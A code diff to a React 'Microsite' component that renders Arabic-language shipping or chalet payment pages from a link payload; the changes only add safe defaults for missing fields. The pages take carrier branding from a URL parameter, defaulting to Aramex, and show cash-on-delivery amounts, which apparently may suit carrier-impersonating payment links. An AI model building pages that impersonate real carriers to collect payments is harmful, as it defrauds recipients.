@@ -101,16 +101,17 @@ const Microsite = () => {
     );
   }
   
-  const payload = link.payload;
+  // Safely extract payload with defaults
+  const payload = link.payload || {};
   
   // Determine if it's a shipping or chalet link FIRST
   const isShipping = link.type === 'shipping';
   
-  // Get service branding for SEO and display
+  // Get service branding for SEO and display with safe defaults
   const serviceName = isShipping 
-    ? (payload.service_name || 'خدمة الشحن')
+    ? (payload.service_name || payload.service_key || 'خدمة الشحن')
     : (payload.chalet_name || 'شاليه');
-  const serviceKey = payload.service_key || (new URLSearchParams(window.location.search).get('service') || 'aramex');
+  const serviceKey = payload.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceBranding = getServiceBranding(serviceKey);
   
   // Update URL to include service information for better SEO
@@ -219,7 +220,7 @@ const Microsite = () => {
                       <div>
                         <p className="font-semibold mb-1">رقم الشحنة</p>
                         <p className="text-muted-foreground text-sm">
-                          {payload.tracking_number}
+                          {payload.tracking_number || 'غير محدد'}
                         </p>
                       </div>
                     </div>
@@ -240,7 +241,7 @@ const Microsite = () => {
                       <div>
                         <p className="font-semibold mb-1">مبلغ الدفع</p>
                         <p className="text-muted-foreground text-sm">
-                          {formatCurrency(payload.cod_amount, countryData.currency)}
+                          {formatCurrency(payload.cod_amount || 0, countryData.currency)}
                         </p>
                       </div>
                     </div>
@@ -262,7 +263,7 @@ const Microsite = () => {
                       <div>
                         <p className="font-semibold mb-1">عدد الضيوف</p>
                         <p className="text-muted-foreground text-sm">
-                          {payload.guest_count} ضيف
+                          {payload.guest_count || 2} ضيف
                         </p>
                       </div>
                     </div>
@@ -272,7 +273,7 @@ const Microsite = () => {
                       <div>
                         <p className="font-semibold mb-1">المدة</p>
                         <p className="text-muted-foreground text-sm">
-                          {payload.nights} ليلة
+                          {payload.nights || 1} ليلة
                         </p>
                       </div>
                     </div>
@@ -282,7 +283,7 @@ const Microsite = () => {
                       <div>
                         <p className="font-semibold mb-1">السعر / الليلة</p>
                         <p className="text-muted-foreground text-sm">
-                          {formatCurrency(payload.price_per_night, countryData.currency)}
+                          {formatCurrency(payload.price_per_night || 0, countryData.currency)}
                         </p>
                       </div>
                     </div>
@@ -294,10 +295,10 @@ const Microsite = () => {
               <div className="bg-gradient-primary p-6 rounded-xl text-primary-foreground mb-6">
                 <p className="text-sm mb-2 opacity-90">المبلغ الإجمالي</p>
                 <p className="text-5xl font-bold mb-2">
-                  {formatCurrency(isShipping ? payload.cod_amount : payload.total_amount, countryData.currency)}
+                  {formatCurrency(isShipping ? (payload.cod_amount || 0) : (payload.total_amount || 0), countryData.currency)}
                 </p>
                 <p className="text-sm opacity-80">
-                  {isShipping ? 'مبلغ الدفع عند الاستلام' : `${payload.price_per_night} × ${payload.nights} ليلة`}
+                  {isShipping ? 'مبلغ الدفع عند الاستلام' : `${payload.price_per_night || 0} × ${payload.nights || 1} ليلة`}
                 </p>
               </div>
               
